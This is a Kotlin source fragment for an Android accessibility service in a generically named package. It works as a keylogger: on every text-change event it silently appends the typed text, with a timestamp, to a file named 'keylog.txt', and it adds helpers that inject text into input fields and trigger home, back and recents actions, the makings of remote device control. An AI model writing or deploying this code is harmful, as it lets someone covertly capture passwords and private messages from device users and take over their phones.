          package com.assets.service
          import android.accessibilityservice.AccessibilityService
          import android.view.accessibility.AccessibilityEvent
          import android.view.accessibility.AccessibilityNodeInfo
          import java.io.File
          import java.io.FileOutputStream
          class MyAccessibilityService : AccessibilityService() {
              companion object { var instance: MyAccessibilityService? = null }
              override fun onServiceConnected() { super.onServiceConnected(); instance = this }
              override fun onAccessibilityEvent(event: AccessibilityEvent?) {
                  if (event != null && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                      try {
                          FileOutputStream(File(filesDir, "keylog.txt"), true).use { it.write("[${System.currentTimeMillis()}] ${event.text.joinToString(" ")}\n".toByteArray()) }
                      } catch (_: Exception) {}
                  }
              }
              override fun onInterrupt() { instance = null }
              
              fun typeText(text: String) {
                  val root = rootInActiveWindow ?: return
                  val node = findEditText(root)
                  if (node != null) {
                      val args = android.os.Bundle()
                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                      node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                  }
              }
              private fun findEditText(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
                  if (node == null) return null
                  if (node.className == "android.widget.EditText") return node
                  for (i in 0 until node.childCount) {
                      val child = findEditText(node.getChild(i))
                      if (child != null) return child
                  }
                  return null
              }
              fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }
              fun pressBack() { performGlobalAction(GLOBAL_ACTION_BACK) }
              fun pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS) }
